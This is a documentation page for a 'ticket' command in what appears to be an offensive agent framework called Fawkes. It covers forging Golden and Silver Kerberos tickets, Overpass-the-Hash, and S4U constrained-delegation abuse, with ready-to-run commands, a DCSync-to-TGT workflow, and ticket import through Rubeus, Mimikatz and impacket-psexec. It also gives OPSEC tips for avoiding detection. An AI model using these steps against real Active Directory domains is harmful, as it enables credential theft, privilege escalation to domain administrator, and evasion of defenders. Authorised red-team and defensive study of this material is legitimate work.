+++
title = "ticket"
chapter = false
weight = 106
hidden = false
+++

## Summary

Forge, request, or delegate Kerberos tickets using extracted encryption keys.

**Forge — Golden Ticket** (T1558.001): Forges a TGT using the `krbtgt` account's encryption key. Pure offline cryptographic operation — no network traffic.

**Forge — Silver Ticket** (T1558.002): Forges a TGS for a specific service using the service account's encryption key. Also offline.

**Request — Overpass-the-Hash** (T1550.002): Performs an AS-REQ exchange with a KDC using a stolen key (AES256, AES128, or RC4/NTLM hash) to obtain a legitimate TGT. This is an online operation that contacts the Domain Controller on port 88.

**S4U — Constrained Delegation** (T1134.001): Performs S4U2Self + S4U2Proxy to obtain a service ticket for an impersonated user via constrained delegation. Requires a service account with `msDS-AllowedToDelegateTo` and `TrustedToAuthForDelegation` (protocol transition). Online operation against the KDC.

Outputs tickets in kirbi format (for Rubeus/Mimikatz on Windows) or ccache format (for Linux/macOS `KRB5CCNAME`).

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| `-action` | Yes | Action: `forge` (offline), `request` (Overpass-the-Hash), or `s4u` (constrained delegation) |
| `-realm` | Yes | Kerberos realm / AD domain (e.g., `CORP.LOCAL`) |
| `-username` | Yes | Username for the ticket (forge/request) or service account with delegation (s4u) |
| `-key` | Yes | Encryption key in hex (from DCSync, hashdump, etc.) |
| `-key_type` | No | Key type: `aes256` (default), `aes128`, `rc4`/`ntlm` |
| `-format` | No | Output format: `kirbi` (default) or `ccache` |
| `-server` | No* | KDC address (e.g., `dc01.corp.local`). *Required for request and s4u.* |
| `-impersonate` | No* | User to impersonate (e.g., `Administrator`). *Required for s4u.* |
| `-spn` | No* | Target SPN. Silver Ticket: `cifs/dc01.corp.local`. S4U: FQDN SPN to delegate to. *Required for s4u.* |
| `-domain_sid` | No* | Domain SID (e.g., `S-1-5-21-...`). *Required for forge.* |
| `-user_rid` | No | User RID for forge (default: 500) |
| `-kvno` | No | Key Version Number for forge (default: 2) |
| `-lifetime` | No | Ticket lifetime in hours for forge (default: 24) |

## Usage

### Golden Ticket with AES256 (kirbi)

First extract the krbtgt key via [dcsync](/agents/fawkes/commands/dcsync/):

```
dcsync -server 192.168.1.1 -username admin@corp.local -password pass -target krbtgt
```

Then forge a Golden Ticket:

```
ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-1234567890-1234567890-1234567890 -key <aes256_hex_key>
```

### Golden Ticket with RC4/NTLM (ccache for Linux)

```
ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <ntlm_hash> -key_type rc4 -format ccache
```

### Silver Ticket for CIFS

```
ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <computer_aes256_key> -spn cifs/dc01.corp.local
```

### Silver Ticket for MSSQL

```
ticket -action forge -realm CORP.LOCAL -username sqlsvc -domain_sid S-1-5-21-... -key <service_aes256_key> -spn MSSQLSvc/db01.corp.local:1433
```

### Overpass-the-Hash (Request TGT from KDC)

Use a stolen key to request a real TGT from the Domain Controller:

```
ticket -action request -realm CORP.LOCAL -username admin -key <aes256_key> -server dc01.corp.local
```

With RC4/NTLM hash (ccache for Linux):

```
ticket -action request -realm CORP.LOCAL -username admin -key <ntlm_hash> -key_type rc4 -format ccache -server dc01.corp.local
```

### S4U — Constrained Delegation Abuse

Impersonate a user via S4U2Self + S4U2Proxy using a service account with constrained delegation rights:

```
ticket -action s4u -realm NORTH.SEVENKINGDOMS.LOCAL -username jon.snow -key <ntlm_hash> -key_type rc4 -server dc02.north.local -impersonate Administrator -spn CIFS/winterfell.north.sevenkingdoms.local
```

With AES256 key (ccache for Linux):

```
ticket -action s4u -realm CORP.LOCAL -username svc_sql -key <aes256_key> -server dc01.corp.local -impersonate Administrator -spn MSSQLSvc/sql01.corp.local:1433 -format ccache
```

{{% notice info %}}
**Important:** Use FQDN-style SPNs (e.g., `CIFS/dc01.corp.local` not `CIFS/dc01`). The KDC may return empty responses for short SPNs.
{{% /notice %}}

### DCSync + OPtH Workflow

1. Extract a user's keys:
```
dcsync -server dc01.corp.local -username admin@corp.local -password pass -target targetuser
```

2. Request a TGT using the extracted key:
```
ticket -action request -realm CORP.LOCAL -username targetuser -key <aes256_key> -server dc01.corp.local -format ccache
```

3. Import the ticket:
```
klist -action import -ticket <base64_from_step_2>
```

## Output

```
[*] Golden Ticket (TGT) forged successfully
    User:      Administrator@CORP.LOCAL (RID: 500)
    Domain:    CORP.LOCAL
    SID:       S-1-5-21-1234567890-1234567890-1234567890
    Key Type:  aes256 (etype 18)
    Valid:     2026-02-24 12:00:00 UTC — 2026-02-25 12:00:00 UTC
    Format:    kirbi
    KVNO:      2

[+] Base64 kirbi ticket:
doIFxjCCBcKgAwIBBaEDAgEWo...

[*] Usage: Rubeus.exe ptt /ticket:<base64>
[*] Usage: [IO.File]::WriteAllBytes('ticket.kirbi', [Convert]::FromBase64String('<base64>'))
```

## Using Forged Tickets

### Windows (kirbi format)

```powershell
# Import with Rubeus
Rubeus.exe ptt /ticket:<base64>

# Save to file and import with Mimikatz
[IO.File]::WriteAllBytes('ticket.kirbi', [Convert]::FromBase64String('<base64>'))
kerberos::ptt ticket.kirbi
```

### Linux/macOS (ccache format)

```bash
# Save ccache file
echo '<base64>' | base64 -d > /tmp/krb5cc_forged

# Set environment variable
export KRB5CCNAME=/tmp/krb5cc_forged

# Use with tools
smbclient -k //dc01.corp.local/C$
impacket-psexec -k -no-pass corp.local/Administrator@dc01
```

## Key Sources

| Key Type | Source | Key Length |
|----------|--------|------------|
| AES256 | DCSync, LSASS dump, hashdump | 64 hex chars (32 bytes) |
| AES128 | DCSync, LSASS dump | 32 hex chars (16 bytes) |
| RC4/NTLM | DCSync, hashdump, NTDS.dit | 32 hex chars (16 bytes) |

## OPSEC Considerations

{{% notice info %}}
**Forge** is a local cryptographic operation — no network traffic. Detection relies on anomalous ticket usage (event IDs 4769, 4770).

**Request** (Overpass-the-Hash) generates a real AS-REQ to the KDC on port 88. This produces a legitimate 4768 (TGT Request) event — blends with normal authentication traffic.

**S4U** generates TGS-REQ traffic to the KDC (3 requests: AS-REQ for TGT, S4U2Self TGS-REQ, S4U2Proxy TGS-REQ). Produces event ID 4769 for the S4U2Proxy service ticket. The service account must have constrained delegation configured with protocol transition (`TrustedToAuthForDelegation`).
{{% /notice %}}

- AES256 keys are preferred over RC4 — RC4 tickets may trigger alerts in environments monitoring for etype downgrade
- Silver Tickets are harder to detect than Golden Tickets since they don't touch the DC
- Golden Tickets survive password resets for all users except `krbtgt` (krbtgt password reset invalidates all Golden Tickets)
- OPtH with AES256 keys is the stealthiest option — matches normal domain authentication exactly
- Default lifetime is 24 hours; longer lifetimes may trigger anomaly detection

## MITRE ATT&CK Mapping

- **T1558.001** — Steal or Forge Kerberos Tickets: Golden Ticket
- **T1558.002** — Steal or Forge Kerberos Tickets: Silver Ticket
- **T1550.002** — Use Alternate Authentication Material: Pass the Hash (Overpass-the-Hash)
- **T1134.001** — Access Token Manipulation: Token Impersonation/Theft (S4U Constrained Delegation)
